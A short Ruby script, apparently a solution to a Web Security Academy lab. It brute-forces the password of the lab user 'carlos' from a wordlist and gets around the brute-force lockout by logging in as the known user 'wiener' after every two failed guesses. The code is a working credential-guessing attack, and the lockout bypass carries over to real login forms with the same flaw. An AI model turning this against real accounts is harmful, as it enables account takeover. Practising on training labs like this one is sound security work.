=begin
valid -> wiener:peter
target -> carlos
=end

require 'http'
require 'nokogiri'

$url='https://0a950091032442e691c0bbb9002f0043.web-security-academy.net/login'

def reset_counter
	username = 'wiener'
	password = 'peter'
	resct = HTTP.post($url,:form=>{:username=>"#{username}",:password=>"#{password}"})
	return 0
end

fhu = File.new 'users.txt','r'
fhp = File.new 'passwd.txt','r'

users = fhu.readlines
passwd = fhp.readlines

fhu.close
fhp.close

counter = 0

# Enumerate Valid Password 
passwd.count.times do |i|
	resp = HTTP.post($url,:form => {:username=>"carlos",:password=>"#{passwd[i].chomp}"})
	code = resp.code

	a = Nokogiri.parse resp.body.to_s
	b = a.search(:css,'p.is-warning').text
	puts b
	puts code
	if code==302
		puts "Password : #{passwd[i].chomp}"
		break
	end
	counter+=1
	counter=reset_counter if counter==2
end
